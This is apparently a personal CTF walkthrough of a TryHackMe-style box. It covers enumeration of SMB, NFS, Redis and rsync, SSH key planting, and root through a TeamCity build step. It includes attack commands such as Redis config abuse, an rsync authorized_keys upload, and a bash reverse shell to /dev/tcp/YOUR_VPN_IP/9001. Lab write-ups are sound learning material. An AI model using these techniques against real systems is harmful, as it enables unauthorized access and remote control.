#completed 
[[SMB]] [[redis]] [[rsync]] [[Reverse Shell]]
Detailed Scan Report:
```
nmap -p 22,111,139,445,873,2049,6379,34343,36817,36973,52585,55955 -sC -sV -oN nmap/detailed 10.48.155.237
Nmap scan report for 10.48.155.237 (10.48.155.237)
Host is up (0.15s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 01:86:f7:77:e2:e8:8e:d4:a0:ac:7c:f8:6d:e5:ab:80 (RSA)
|   256 e2:26:5e:e3:53:91:d6:85:cc:13:f1:fb:1c:07:23:d8 (ECDSA)
|_  256 b3:49:a3:12:fe:f6:26:9f:03:92:b1:9b:a6:25:cc:01 (ED25519)
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
873/tcp   open  rsync       (protocol version 31)
2049/tcp  open  nfs_acl     3 (RPC #100227)
6379/tcp  open  redis       Redis key-value store
34343/tcp open  java-rmi    Java RMI
36817/tcp open  nlockmgr    1-4 (RPC #100021)
36973/tcp open  mountd      1-3 (RPC #100005)
52585/tcp open  mountd      1-3 (RPC #100005)
55955/tcp open  mountd      1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-12-06T04:29:48
|_  start_date: N/A
|_clock-skew: 1m33s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
```

We have file transfer and sharing SMB (139,445), NFS (2049,111, +random high ports), and Rsync (873). These three are file transfer and sharing protocols, SMB is for windows-style file sharing running on linux which is Samba. %% Samba is an open-source software suite that implements the SMB, allowing Linux/Unix systems to share files and printers with Windows computers, integrating seamlessly into Windows networks. %%. While on the other hand NFS is a linux-native network file system, then Rsync is for synchronizing files and folders.

Next are the databases and middleware which are redis and java RMI. Then remote access protocol SSH.

The main way in with this output is the SSH, but there are file sharing services such as SMB, NFS, and Rsync. With this, we can first search within SMB then work our way up to Rsync if there is no hints to how i can get in the system.


```
smbclient -L $IP
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
shares          Disk      VulnNet Business Shares
IPC$            IPC       IPC Service (ip-10-48-155-237 server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```
It has three share names which are print, shares, and IPC$. Print and IPC is standard for SMB but there are no default shares in the SMB protocol. Next path is to connect to this specific share using //IP-address/share-name

```
smbclient //$IP/shares
Password for [WORKGROUP\xynate]: // just enter
smb: \> ls
  .                                   D        0  Tue Feb  2 17:20:09 2021
  ..                                  D        0  Tue Feb  2 17:28:11 2021
  temp                                D        0  Sat Feb  6 19:45:10 2021
  data                                D        0  Tue Feb  2 17:27:33 2021
         15376180 blocks of size 1024. 2252228 blocks available
smb: \> cd temp
smb: \temp\> ls
  .                                   D        0  Sat Feb  6 19:45:10 2021
  ..                                  D        0  Tue Feb  2 17:20:09 2021
  services.txt                        N       38  Sat Feb  6 19:45:09 2021
smb: \temp\> cd ..
smb: \> cd data
smb: \data\> ls
  .                                   D        0  Tue Feb  2 17:27:33 2021
  ..                                  D        0  Tue Feb  2 17:20:09 2021
  data.txt                            N       48  Tue Feb  2 17:21:18 2021
  business-req.txt                    N      190  Tue Feb  2 17:27:33 2021
smb: \data\> ^C
```
After exploring the shared folder **share** we can now get the file by using smbclient commands in our machine.

`smbclient //10.48.155.237/shares -c 'recurse ON; prompt OFF; mget *'`

with this, we got services.txt flag "THM{0a09d51e488f5fa105d8d866a497440a}" . but the data/ directory only holds the following:

Purge regularly data that is not needed anymore - data.txt
We just wanted to remind you that we’re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed. 
If you have any questions, please text or phone us. - business-req.txt

Before we proceed to the next step, lets first start getting some clues within these .txt in the data. data.txt suggests a cron job which is a scheduled task on the system. If we can find the script that runs automatically and we can wwrite to it, we can escalate our privileges. It might also hint that data in the next service might be volatile. business-req.txt has the words "**Complete the TRANSACTION**" This is a huge hint that leads us to the database. Redis is a key-value store often used for caching transactions.

Now that we have explored SMB, lets go to the other file sharing and transfer protocols. Lets first start with NFS enumeration then REDIS enumeration, REDIS enumeration is often left without a password. it might contain credentials in plain-text or we might be able to use it to put a ssh key to the disk of the machine. and NFS enumeration is for mis-configurations where the /home directory is shared.

```
❯ showmount -e $IP
Export list for 10.48.155.237:
/opt/conf *

❯ sudo mount -t nfs $IP:/opt/conf ./nfs_loot -o nolock
❯ ls -la nfs_loot
total 32
drwxr-xr-x 9 root   root   4096 Feb  2  2021 .
drwxr-xr-x 9 xynate xynate  220 Dec  6 13:38 ..
drwxr-xr-x 2 root   root   4096 Feb  2  2021 hp
drwxr-xr-x 2 root   root   4096 Feb  2  2021 init
drwxr-xr-x 2 root   root   4096 Feb  2  2021 opt
drwxr-xr-x 2 root   root   4096 Feb  2  2021 profile.d
drwxr-xr-x 2 root   root   4096 Feb  2  2021 redis
drwxr-xr-x 2 root   root   4096 Feb  2  2021 vim
drwxr-xr-x 2 root   root   4096 Feb  2  2021 wildmidi
```

there is a mountable share, which is /opt/conf. /opt/conf/ might contains configs, user preference/options, and overrides. Lets mount the remote share by using sudo mount. This is an /etc/ directory which are config files for the machine. Redis is one of the key prospects we have to look at, because port 6379 is open based from our NMAP search from earlier, and the transaction hint from earlier which aligns with the usage of this protocol. So our main goal now is to read redis file so we can get the key to the database.

```
❯ ls -la
total 68
drwxr-xr-x 2 root root  4096 Feb  2  2021 .
drwxr-xr-x 9 root root  4096 Feb  2  2021 ..
-rw-r--r-- 1 root root 58922 Feb  2  2021 redis.conf
```

In a config file of redis, we should always find these key details which are bind, dir/dbfilename, requirepass, and rename-command. 
**bind** is for the network gatekeeper, if this is set to 127.0.0.1, it means that redis is only listening on localhost. even if we can authenticate, i cant connect from my machine directly. we need to SSH in first or use port forwarding. 
Then **dir** and **dbfilename** is for Redis Remote Code Execution. If I can change the directory and dbfilename using the config set command, I can trick Redis into writing a file anywhere on the system. The attack would be to write an SSH public key into memory, then change the directory to /root/.ssh/, then change the filename to our authorized_keys. But to use this exploit i have to know where the default directory is to see if the user running redis has permissions to write elsewhere. 
Then lastly the **rename** command is for hardening techniques, Administrators often disable dangerous commands like CONFIG (which allows you to change the directory) or MODULE LOAD (which allows you to load malicious plugins) by renaming them to an empty string (disabling them) or a random string. Then requirepass shows the plaintext password.

One command to get all of these details is:

```
❯ grep -E "^\s*(requirepass|bind|dir|rename-command)" redis.conf
rename-command FLUSHDB ""
rename-command FLUSHALL ""
bind 127.0.0.1 ::1
dir /var/lib/redis
requirepass "B65Hx562F@ggAZ@F"
```

Lets break this down first. We got requirepass which is the key to logging in. but we also see that it says bind 127.0.0.1, which means I have to ssh in first before using this. But I recall from our nmap search that port 6379 is open and identified the version. This means that we can still access it. There is no rename-command CONFIG, meaning I can change settings, which is crucial for RCE.

Lets first login using the password we got, then check the information of the REDIS server.

```
❯ redis-cli -h $IP -a "B65Hx562F@ggAZ@F"
10.48.155.237:6379> info server
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:66bd629f924ac924
redis_mode:standalone
os:Linux 5.15.0-139-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:9.3.0
process_id:774
run_id:4d401cefeec50696cb3a0966005484f327706fe6
tcp_port:6379
uptime_in_seconds:8874
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:3393238
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
```

Since we can access the server, and we have administrator access because we can use the command info server. we can now create a ssh key and put it into the machine. Back in my machine create an ssh key then format the key for redis then inject the key into memory.

```
❯ ssh-keygen -t rsa -b 4096 -f redis_key
Generating public/private rsa key pair.
Enter passphrase for "redis_key" (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in redis_key
Your public key has been saved in redis_key.pub
The key fingerprint is:
SHA256:qy0juoTLLa1LEo2mdLUgdOzsUpZ+E+PyBXAwTEPE/ZM xynate@xynate
The key's randomart image is:
+---[RSA 4096]----+
| .BOo            |
|. .=oo           |
| .o.+.. .        |
| o.*o+.E         |
|oo*...+ S        |
|++.+ + . .       |
|+.+ + o .        |
|++....oo         |
|.+*+ ..o.        |
+----[SHA256]-----+
❯ (echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > payload.txt
❯ cat payload.txt | redis-cli -h 10.48.155.237 -a "B65Hx562F@ggAZ@F" -x set ssh_key
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
OK
❯ redis-cli -h 10.48.155.237 -a "B65Hx562F@ggAZ@F"
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.48.155.237:6379> config set dir /root/.ssh/
(error) ERR Changing directory: Permission denied
10.48.155.237:6379> config set dir /home/ubuntu/.ssh/
(error) ERR Changing directory: Permission denied
```

It seems that I dont have permission to drop the key into the directory, lets go for another path which would be Rsync (port 873).

```
❯ rsync --list-only 10.48.155.237::
files           Necessary home interaction
❯ rsync -av --list-only 10.48.155.237::files
Password:
@ERROR: auth failed on module files
rsync error: error starting client-server protocol (code 5) at main.c(1850) [Receiver=3.4.1]
```

Hmm, i tried using the password from earlier, but it seems that it only is acceptable to redis. im going to try to find passwords and check if they reused it for rsync. I found the password in /opt/conf, maybe its in there too.

Tried everything, maybe its not here. im going to use enum4linux just to make sure i dont miss anything. 

Okay nevermind, after a 2 hours i got something, i went back to redis and checked the keys * which contains the internal flag = "THM{ff8e518addbbddb74531a724236a8221}", within here there is also a list which is an authentication list, we can find out the tokens from here. it contains

```
KEYS *
1) "authlist"
2) "internal flag"
3) "marketlist"
4) "tmp"
5) "int"
10.10.6.16:6379> GET "internal flag"
"THM{ff8e518addbbddb74531a724236a8221}"
10.10.6.16:6379> lrange authlist 1 20
6) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
7) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
8) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
```

With the given auth list we can put it through cyberchef and it will give me the output from base64

```
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
```

with a given password and an rsync, we can sync a file into the server which would be the ssh key.

```
rsync -av authorized_keys rsync-connect@$IP::files/sys-internal/.ssh/
ssh -i redis_key sys-internal@10.48.155.237
```

Then you can login now, with a simple ls command we can find the user.txt, last one is to get root access to get root.txt. lets first do enum and privilege escalation.

```
ps -ef --forest | tee output.txt
root         781       1  0 11:36 ?        00:00:00 sh teamcity-server.sh _start_internal
root         788     781  0 11:36 ?        00:00:00  \_ sh /TeamCity/bin/teamcity-server-restarter.sh run
root        1259     788 22 11:36 ?        00:05:03      \_ /usr/lib/jvm/default-java/bin/java -Djava.util.logging.config.file=/TeamCity/conf/log>
root        1790    1259  0 11:38 ?        00:00:02          \_ /usr/lib/jvm/java-11-openjdk-amd64/bin/java -DTCSubProcessName=TeamCityMavenServe>
```

Has a red flag because it is running as root, and it is running from /teamcity/

now we have to port forward using ssh tunneling which would be -L 8111:127.0.0.1:8111. then use bash -c 'bash -i >& /dev/tcp/YOUR_VPN_IP/9001 0>&1' in the build step command line in the localhost of the teamcity. but first create a team city supper account which would be accessed using a token. the token is in the TeamCity/logs in catalina.out just grep for super user authetncation.

after that just use a backdoor which would be nc 9001 and you are going to be accessing it via root.
